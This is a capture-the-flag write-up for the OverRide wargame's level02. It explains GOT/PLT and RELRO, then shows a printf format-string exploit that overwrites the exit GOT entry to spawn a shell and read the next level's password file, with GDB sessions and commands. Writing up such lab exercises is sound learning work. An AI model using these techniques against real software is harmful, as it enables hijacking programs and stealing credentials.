# Tools
[Dogbolt - Decompiler Explorator](https://dogbolt.org/)
[Cutter - Reverse Engineering Tool](https://cutter.re/)
[GNU DeBugger - GDB](https://fr.wikipedia.org/wiki/GNU_Debugger)

# Exploit
The home of level02 contains a binary, as usual.
However, traditionally the message is:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level01/level01
```
Indicating a partial RELRO, but this time we have got:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
```
So, for that exploit, there is no [RELRO](https://ctf101.org/binary-exploitation/relocation-read-only/).
Basically, RELRO is a system that makes parts of a binary read-only. It mainly concerns the Global Offset Table (or GOT for short), which stores all the offsets of the different functions belonging to dynamic libraries. These offsets are retrieved using the Procedural Linking Table (PLT).
Having no RELRO means it's easier to make a GOT/PLT exploit, thus that's where we are going to be on the lookout for.

## What's GOT and PLT?
When a program requires external libraries, the compiler will dynamically link them to the binary. 
Example:
```c
int main() {
	printf("Hello World1\n");
	exit(0);
	return 0;
}
```
`printf()` and `exit()` are clearly not defined in my code, they belong to the libc.
Using `ldd`, we can see that the `level02` binary also depends on external and dynamically linked libraries:
```
level02@OverRide:~$ ldd level02
	linux-vdso.so.1 =>  (0x00007ffff7ffd000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c37000)
	/lib64/ld-linux-x86-64.so.2 (0x0000555555554000)
```
The problem is, how am I suppose to find the address of certain functions, when I can't know in advance where the library is going to be located? (if ASLR is on, the address of the library changes at each execution).
THat's where the GOT/PLT system comes handy.

During compilation, we don't know yet at what addresses external functions are. So we create a "trampoline function", that's going to then bounce to the real function once we will have linked the compiled files and the external libraries. The PLT (where the execution bounces to) will retrieve the real address of the function and store it in a table: the GOT.

The first time we land in the tremplin function, the address of teh real function isn't resolved yet.
So the code uses the function `dl_runtime_resolve`, a funtion of the dynamic linker / loader, responsible for retrieving the address, stroing it in the GOT and executing the desired function. Once it has been retrieved once, it's cached in the GOT for next uses.

Example tremplin function:
```
j_puts:
	jmp	qword [ds:puts@GOT] ; <-- Is not set so will get ignored
	push 0x0 ; Increases by one for each function to be dynamically loaded
	jmp 0x400440 ; Call to `dl_runtime_resolve`
```
Once `dl_runtime_resolve` has been called once, the address in the GOT is updated, so it jumps at the first jump instruction and don't go through the `push` and second `jmp` instruction again. 

## Printf Exploitation
`printf()` seems to be a pretty useless function when it comes to finding vulnerabilities.
Actually, it's not. 
`printf()` being called like:
```c
printf(user_supplied_input);
```
can lead to serious problems. As you can see, the format string is passed by the user and there are no parameters after the format string. The correct way to call tjat function would have been:
```c
printf("%s", user_supplied_input);
```

`printf` supports different formatters. The one we will take a look at are `%x` and `%n`.
On the first hand, `%x` allows one to dump memory out of the stack: `printf` makes a `pop` and prints stack addresses.
On the second hand, `%n` allows one to write on the stack: it writes the numbers of bytes written by `printf` so far. Example: `printf("AAAA%n");` will write 4 on the stack (still, notice the lack of variadic parameters after the format string), effectively performing a `psh` on the stack.

Using that information, we can `pop` and `psh` data out and to the stack, and try to corrupt specific parts of it. See [Simple format String exploit - LiveOverflow](https://www.youtube.com/watch?v=0WvrSfcdq1I)


## Combining GOT/PLT with a Format String exploit
As we can see in the source file, the program exits if the password is wrong. We are going to use the gathered knowledge to redirect the execution by overwriting the exit entry in the GOT.

Start GDB.
Upon disassembmling main, we see that the address where we want to resume execution is `0x0000000000400a85`, there address where "/bin/sh" is being moved to the register `edi` before the `system` call.

Then, we add a breakpoint to the first `exit` call, where the program exits if it couldn't open the `.pass` file; it's going to happen has GDB doesn't start the binary with SUID permission, so it's going to exit here as it couldn't open the file.
```
(gdb) b *0x00000000004008e1
```
Start the program, we reach the break point. Now, we disassemble the exit function (which is actually the tremplin function made by our program waiting for GOT/PLT to cache the real address of the `exit` function in `libc`):
```
(gdb) disass 0x400710
Dump of assembler code for function exit@plt:
   0x0000000000400710 <+0>:	jmp    QWORD PTR [rip+0x200b12]        # 0x601228 <exit@got.plt>
   0x0000000000400716 <+6>:	push   0xa
   0x000000000040071b <+11>:	jmp    0x400660
End of assembler dump.
```
As you can see, there the address of `exit` in the GOT specified in comment.
If we examine that address:
```
(gdb) x 0x601228
0x601228 <exit@got.plt>:	0x00400716
```
We see that it belongs in the `GOT/PLT` process.

Still in GDB, on the breakpoint, we can simulate the GOT attack by replacing the value stored in the GOT for `exit` by the address where we want to resume execution:
```
(gdb) set {int}0x601228=0x0000000000400a85
(gdb) c
Continuing.
$ ls
input.txt  level02  test  test_program.c
```
It works!

Now, let's do it for real.

By fidgetting with the program, I found that I needed to 7 values to access my data (the 8th value); `0x74736574` is `test`, reversed.
```
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p %p %p %p %p %p %p %p
--[ Password: test
*****************************************
0x7fffffffe580 (nil) 0x74 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe778 0x1f7ff9a08 0x74736574 does not have access!
level02@OverRide:~$
```

Our goal is to rewrite the 4 lowest bytes of the GOT saved address of exit by the 4 lowest bytes of the address we want to resume execution to. These are: `0x0a85` = `2693`.

We pop 6 characters before writing, so that's 2693 - 6 = 2687 characters to write, then use `%hn` to only writes the lowest bytes and pad to fill the buffer.

Then, we add on the stack the address of where we want to write, the address in GOT of `exit` using `struct.pack("Q", EXIT)`, 'Q' as the address is an address on a 64-bit system.

Write the output of the payload in a file, feed the file in the program while keeping the standard entry open:
```
level02@OverRide:~$ python payload.py > input.txt && cat input.txt - | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
...
cat /home/users/level03/.pass
```

# Resources
[GOT and PLT Explanation - LiveOverflow](https://www.youtube.com/watch?v=kUk5pw4w0h4)
[Format String Exploit on GOT - LiveOverflow](https://www.youtube.com/watch?v=t1LH9D5cuK4)
[Simple format String exploit - LiveOverflow](https://www.youtube.com/watch?v=0WvrSfcdq1I)